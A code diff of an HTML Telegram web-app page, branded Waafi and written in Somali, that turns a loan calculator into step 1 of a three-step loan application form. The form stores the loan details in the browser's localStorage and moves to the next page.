@@ -3,188 +3,118 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Waafi Loan Calculator</title>
-
-    <!-- ✅ Telegram SDK -->
+    <title>Codsiga Amaahda - Step 1</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 
     <style>
-        body {
-            font-family: -apple-system, sans-serif;
-            background-color: #f1f3f5;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        .app-header {
-            width: 100%;
-            background: linear-gradient(to bottom, #82d13d, #a3e635);
-            padding: 20px 20px 40px;
-            color: white;
-            font-size: 24px;
-            font-weight: bold;
-            display: flex;
-            justify-content: space-between;
-            box-sizing: border-box;
-        }
-
-        .card {
-            background: white;
-            width: 92%;
-            max-width: 450px;
-            margin-top: -25px;
-            padding: 30px 20px;
-            border-radius: 15px;
-            box-shadow: 0 8px 20px rgba(0,0,0,0.08);
-            box-sizing: border-box;
-        }
-
-        h2 {
-            font-size: 22px;
-            color: #333;
-            margin: 0 0 5px;
-            text-align: center;
-        }
-
-        .subtext {
-            font-size: 11px;
-            color: #888;
-            text-align: center;
-            margin-bottom: 30px;
-        }
-
-        .slider-section { margin-bottom: 25px; }
-
-        .slider-header {
-            display: flex;
-            justify-content: space-between;
-            font-weight: 500;
-            font-size: 14px;
-            color: #444;
-        }
-
-        .green-text { color: #82d13d; font-weight: bold; }
-
-        input[type=range] {
-            width: 100%;
-            accent-color: #82d13d;
-            margin: 15px 0;
-            height: 6px;
-        }
-
-        .slider-footer {
-            display: flex;
-            justify-content: space-between;
-            font-size: 11px;
-            color: #bbb;
-        }
-
-        .result-container {
-            background: #fafafa;
-            border: 1px solid #f0f0f0;
-            border-radius: 12px;
-            padding: 15px;
-            text-align: center;
-            margin: 25px 0;
-        }
-
-        .result-value {
-            color: #82d13d;
-            font-size: 32px;
-            font-weight: bold;
-            margin: 0;
-        }
-
-        .btn-apply {
-            background: linear-gradient(to right, #82d13d, #95e14a);
-            color: white;
-            border: none;
-            width: 100%;
-            padding: 18px;
-            border-radius: 10px;
-            font-size: 18px;
-            font-weight: bold;
-            cursor: pointer;
-        }
-
-        .footer {
-            text-align: center;
-            font-size: 11px;
-            color: #ccc;
-            margin: 30px 0;
-        }
+        body { font-family: -apple-system, sans-serif; background-color: #f8f9fa; margin: 0; display: flex; flex-direction: column; align-items: center; }
+        .nav-header { width: 100%; background: linear-gradient(90deg, #a4e433 0%, #4caf50 100%); padding: 15px 20px; color: white; display: flex; justify-content: space-between; align-items: center; box-sizing: border-box; }
+        .waafi-logo { font-size: 24px; font-weight: bold; }
+        .form-card { background: white; width: 92%; max-width: 480px; margin-top: 25px; padding: 30px 20px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.05); box-sizing: border-box; }
+        h2 { text-align: center; margin: 0; font-size: 26px; color: #333; font-weight: 600; }
+        .step-info { text-align: center; font-size: 15px; color: #888; margin: 10px 0 25px; }
+        .progress-box { display: flex; gap: 8px; margin-bottom: 35px; }
+        .bar { height: 4px; flex: 1; background: #e0e0e0; border-radius: 2px; }
+        .active-bar { background: #82d13d; }
+        .input-wrap { margin-bottom: 22px; }
+        label { display: block; font-size: 16px; font-weight: 500; margin-bottom: 10px; color: #333; }
+        select, input, textarea { width: 100%; padding: 15px; border: 1px solid #d1d1d1; border-radius: 8px; font-size: 17px; box-sizing: border-box; background: #fff; }
+        .btn-container { margin-top: 30px; display: flex; flex-direction: column; gap: 15px; }
+        .back-btn { background-color: #f1f1f1; color: #777; border: 1px solid #ddd; padding: 16px; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; }
+        .next-btn { background: linear-gradient(90deg, #a4e433 0%, #7dbd27 100%); color: white; border: none; padding: 18px; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
+        .footer-text { text-align: center; font-size: 13px; color: #aaa; margin-top: 40px; padding-bottom: 30px; }
     </style>
 </head>
 
 <body>
 
-<div class="app-header">
-    <span>Waafi</span>
-    <span>☰</span>
+<div class="nav-header">
+    <div onclick="goBack()" style="cursor:pointer; font-size:20px;">← Dib u noqo</div>
+    <div class="waafi-logo">Waafi</div>
+    <div style="font-size: 26px;">☰</div>
 </div>
 
-<div class="card">
-    <h2>Hel Amaah Deg Deg ah</h2>
-    <div class="subtext">Ansixid degdeg ah • Qiimo tartan ah • Muddooyin dabacsan</div>
+<div class="form-card">
+    <h2>Codsiga Amaahda</h2>
+    <p class="step-info">Tallaabada 1 ee 3</p>
 
-    <div class="slider-section">
-        <div class="slider-header">
-            <span>Qaddarka Amaahda</span>
-            <span id="valAmt" class="green-text">$1,000</span>
-        </div>
-        <input type="range" id="amt" min="100" max="5000" step="100" value="1000">
-        <div class="slider-footer"><span>$100</span><span>$5,000</span></div>
+    <div class="progress-box">
+        <div class="bar active-bar"></div>
+        <div class="bar"></div>
+        <div class="bar"></div>
     </div>
 
-    <div class="slider-section">
-        <div class="slider-header">
-            <span>Muddada Amaahda</span>
-            <span id="valDur" class="green-text">12 bilood</span>
-        </div>
-        <input type="range" id="dur" min="6" max="60" step="6" value="12">
-        <div class="slider-footer"><span>6 bilood</span><span>60 bilood</span></div>
+    <div class="input-wrap">
+        <label>Nooca Amaahda</label>
+        <select id="loanType">
+            <option value="Amaah Shakhsi ah" selected>Amaah Shakhsi ah</option>
+            <option value="Amaah Ganacsi">Amaah Ganacsi</option>
+            <option value="Amaah Baabuur">Amaah Baabuur</option>
+            <option value="Amaah Guri">Amaah Guri</option>
+            <option value="Amaah Waxbarasho">Amaah Waxbarasho</option>
+        </select>
     </div>
 
-    <div class="result-container">
-        <p style="margin:0; font-size:14px; color:#666">Lacagta Bisha</p>
-        <p id="monthly" class="result-value">$98.33</p>
+    <div class="input-wrap">
+        <label>Qaddarka Amaahda ($)</label>
+        <input type="number" id="loanAmount" readonly style="background:#f9f9f9">
     </div>
 
-    <button class="btn-apply" onclick="goToPage2()">CODSO HADDA</button>
+    <div class="input-wrap">
+        <label>Muddada Amaahda</label>
+        <input type="text" id="loanDuration" readonly style="background:#f9f9f9">
+    </div>
+
+    <div class="input-wrap">
+        <label>Ujeedada Amaahda</label>
+        <textarea id="loanPurpose" rows="3" placeholder="Maxaad u isticmaali doontaa?"></textarea>
+    </div>
+
+    <div class="btn-container">
+        <button class="back-btn" onclick="goBack()">KA HORE</button>
+        <button class="next-btn" onclick="goNext()">TALLAABADA XIGTA</button>
+    </div>
 </div>
 
-<div class="footer">© 2025 Waafi Soomaaliya</div>
+<div class="footer-text">© 2026 Waafi Soomaaliya</div>
 
 <script>
-    function update() {
-        const amtEl = document.getElementById('amt');
-        const durEl = document.getElementById('dur');
+    function goNext() {
+        const purposeEl = document.getElementById('loanPurpose');
+        const typeEl = document.getElementById('loanType');
+        const amountVal = document.getElementById('loanAmount').value;
+        const durationVal = document.getElementById('loanDuration').value;
 
-        if (!amtEl || !durEl) return;
+        if (!purposeEl || !typeEl) return;
 
-        const amount = Number(amtEl.value) || 0;
-        const duration = Number(durEl.value) || 1;
+        const purpose = purposeEl.value.trim();
+        const type = typeEl.value;
 
-        document.getElementById('valAmt').innerText = `$${amount.toLocaleString()}`;
-        document.getElementById('valDur').innerText = `${duration} bilood`;
+        if (!purpose) {
+            alert("Fadlan buuxi ujeedada amaahda.");
+            return;
+        }
 
-        const monthly = (amount * 1.18) / duration;
-        document.getElementById('monthly').innerText = `$${monthly.toFixed(2)}`;
+        // --- Standard Save (Your current flow) ---
+        localStorage.setItem('loanPurpose', purpose);
+        localStorage.setItem('loanType', type);
+
+        // --- NEW: Success Page Save (Carrying data forward) ---
+        // Clean the duration string (e.g., "12 Bilood" becomes "12")
+        const cleanDuration = durationVal.replace(/\D/g, ''); 
+        
+        // Calculate monthly (Amount * 1.18 interest / duration) to match your Page 1 logic
+        const monthly = ((Number(amountVal) * 1.18) / Number(cleanDuration)).toFixed(2);
+
+        localStorage.setItem('loan_amount', amountVal);
+        localStorage.setItem('loan_term', cleanDuration);
+        localStorage.setItem('monthly_repayment', monthly);
+
+        window.location.href = "page3.html"; // Ensure this matches your file extension
     }
 
-    function goToPage2() {
-        const amtEl = document.getElementById('amt');
-        const durEl = document.getElementById('dur');
-
-        if (!amtEl || !durEl) return;
-
-        localStorage.setItem('amount', amtEl.value);
-        localStorage.setItem('loanDuration', durEl.value + " Bilood");
-
-        window.location.href = "/page2";
+    function goBack() {
+        window.location.href = "index.html";
     }
 
     window.onload = () => {
@@ -195,15 +125,15 @@
             tg.expand();
         }
 
-        const amtEl = document.getElementById('amt');
-        const durEl = document.getElementById('dur');
+        const amountEl = document.getElementById('loanAmount');
+        const durationEl = document.getElementById('loanDuration');
 
-        if (amtEl) amtEl.addEventListener('input', update);
-        if (durEl) durEl.addEventListener('input', update);
-
-        update();
+        if (amountEl && durationEl) {
+            amountEl.value = String(localStorage.getItem('amount') || "1000");
+            durationEl.value = String(localStorage.getItem('loanDuration') || "12 Bilood");
+        }
     };
 </script>
 
 </body>
-  </html>
+</html>
